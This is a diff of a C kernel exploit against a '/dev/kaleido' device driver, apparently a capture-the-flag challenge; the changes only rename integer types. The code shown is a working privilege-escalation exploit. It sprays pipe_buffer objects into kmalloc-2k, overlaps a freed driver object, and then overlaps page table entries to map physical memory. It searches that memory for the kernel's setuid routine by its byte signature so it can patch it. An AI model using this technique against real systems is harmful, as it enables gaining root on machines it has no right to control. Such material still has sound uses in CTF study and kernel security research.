@@ -13,19 +13,19 @@
 #include "util.h"
 #include "vars.h"
 
-static int32_t kaleido_alloc(char *buf);
-static int32_t kaleido_free(uint64_t idx);
-static int32_t kaleido_read(uint64_t idx, char *buf);
-static int32_t kaleido_write(uint64_t idx, char *buf);
+static i32 kaleido_alloc(char *buf);
+static i32 kaleido_free(u64 idx);
+static i32 kaleido_read(u64 idx, char *buf);
+static i32 kaleido_write(u64 idx, char *buf);
 
 #define NUM_PIPE_SPRAY (0x30)
 #define NUM_PTE_SPRAY (0x10)
 
 struct request {
-    uint64_t idx;
+    u64 idx;
     char *buf;
 };
-int32_t fd;
+i32 fd;
 
 int main(void) {
     puts("[ ] exploit start");
@@ -47,8 +47,8 @@ int main(void) {
     }
 
     puts("[ ] pre-allocating pipes");
-    int32_t pipefd[NUM_PIPE_SPRAY][2];
-    for (uint32_t i = 0; i < NUM_PIPE_SPRAY; i++) {
+    i32 pipefd[NUM_PIPE_SPRAY][2];
+    for (u32 i = 0; i < NUM_PIPE_SPRAY; i++) {
         CHECK(pipe(pipefd[i]));
         CHECK(write(pipefd[i][1], &i, 4));
         CHECK(write(pipefd[i][1], "dead", 4));
@@ -56,7 +56,7 @@ int main(void) {
 
     puts("[ ] pre-allocating PGD, PUD, and PMD");
     void *ptr[NUM_PTE_SPRAY];
-    for (uint32_t i = 0; i < NUM_PTE_SPRAY; i++) {
+    for (u32 i = 0; i < NUM_PTE_SPRAY; i++) {
         ptr[i] =
             mmap((void *)pt_index_to_vaddr(1, 2, i, 0, 0), 0x200 * PAGE_SIZE,
                  PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE, -1, 0);
@@ -69,7 +69,7 @@ int main(void) {
     fd = CHECK(open("/dev/kaleido", O_RDWR));
 
     puts("[ ] spraying struct pipe_buffer at kmalloc-2k");
-    for (uint32_t i = 0; i < NUM_PIPE_SPRAY / 2; i++) {
+    for (u32 i = 0; i < NUM_PIPE_SPRAY / 2; i++) {
         CHECK(fcntl(pipefd[i][1], F_SETPIPE_SZ, 0x1000 * 32));  // 0x28 * 32 = 0x500
     }
 
@@ -77,7 +77,7 @@ int main(void) {
     kaleido_alloc((void *)0xdeadbeef);
 
     puts("[+] overlapping struct pipe_buffer to the victim object");
-    for (uint32_t i = NUM_PIPE_SPRAY / 2; i < NUM_PIPE_SPRAY; i++) {
+    for (u32 i = NUM_PIPE_SPRAY / 2; i < NUM_PIPE_SPRAY; i++) {
         CHECK(fcntl(pipefd[i][1], F_SETPIPE_SZ, 0x1000 * 32));
     }
 
@@ -88,10 +88,10 @@ int main(void) {
     CHECK(kaleido_write(0, buf));
 
     puts("[ ] finding the victim pipe_buffer");
-    int32_t victim[2] = {0};
-    int32_t origin[2] = {0};
-    for (uint32_t i = 0; i < NUM_PIPE_SPRAY; i++) {
-        uint32_t idx;
+    i32 victim[2] = {0};
+    i32 origin[2] = {0};
+    for (u32 i = 0; i < NUM_PIPE_SPRAY; i++) {
+        u32 idx;
         CHECK(read(pipefd[i][0], &idx, 4));
         if (idx != i) {
             victim[0] = pipefd[idx][0];
@@ -111,15 +111,15 @@ found_victim:
     CHECK(close(origin[1]));
 
     puts("[+] overlapping PTE to the freed page");
-    for (uint32_t i = 1; i < NUM_PTE_SPRAY; i++) {
+    for (u32 i = 1; i < NUM_PTE_SPRAY; i++) {
         *(char *)ptr[i] = 0;
     }
 
-    uint64_t pte[0x1ff];
-    const uint64_t offset_setuid = 0x6dce0;
-    for (uint32_t i = 0; i < 0x1ff; i++) {
-        const uint64_t phys_base = CONFIG_PHYSICAL_START + i * CONFIG_PHYSICAL_ALIGN;
-        const uint64_t page_setuid = align_to_page(phys_base + offset_setuid);
+    u64 pte[0x1ff];
+    const u64 offset_setuid = 0x6dce0;
+    for (u32 i = 0; i < 0x1ff; i++) {
+        const u64 phys_base = CONFIG_PHYSICAL_START + i * CONFIG_PHYSICAL_ALIGN;
+        const u64 page_setuid = align_to_page(phys_base + offset_setuid);
         pte[i] = phys_page_to_pte(page_setuid);
     }
 
@@ -128,11 +128,11 @@ found_victim:
 
     puts("[ ] finding setuid");
     char *addr;
-    for (uint32_t i = 1; i < NUM_PTE_SPRAY; i++) {
-        for (uint32_t j = 1; j < 0x200; j++) {
-            const uint64_t addr_page_setuid = (uint64_t)ptr[i] + pte_index_to_vpart(j);
-            const uint64_t addr_setuid = addr_page_setuid + vaddr_to_page_offset(offset_setuid);
-            if (*(uint64_t *)addr_setuid == 0x55415641e5894855) {
+    for (u32 i = 1; i < NUM_PTE_SPRAY; i++) {
+        for (u32 j = 1; j < 0x200; j++) {
+            const u64 addr_page_setuid = (u64)ptr[i] + pte_index_to_vpart(j);
+            const u64 addr_setuid = addr_page_setuid + vaddr_to_page_offset(offset_setuid);
+            if (*(u64 *)addr_setuid == 0x55415641e5894855) {
                 addr = (void *)addr_setuid;
                 goto found_setuid;
             }
@@ -157,21 +157,21 @@ found_setuid:
 #define CMD_READ 0x13370002u
 #define CMD_WRITE 0x13370003u
 
-static int32_t kaleido_alloc(char *buf) {
+static i32 kaleido_alloc(char *buf) {
     struct request req = {.idx = 0, .buf = buf};
     return ioctl(fd, CMD_ALLOC, &req);
 }
 
-static int32_t kaleido_free(uint64_t idx) {
+static i32 kaleido_free(u64 idx) {
     struct request req = {.idx = idx, .buf = NULL};
     return ioctl(fd, CMD_FREE, &req);
 }
 
-static int32_t kaleido_read(uint64_t idx, char *buf) {
+static i32 kaleido_read(u64 idx, char *buf) {
     struct request req = {.idx = idx, .buf = buf};
     return ioctl(fd, CMD_READ, &req);
 }
-static int32_t kaleido_write(uint64_t idx, char *buf) {
+static i32 kaleido_write(u64 idx, char *buf) {
     struct request req = {.idx = idx, .buf = buf};
     return ioctl(fd, CMD_WRITE, &req);
 }
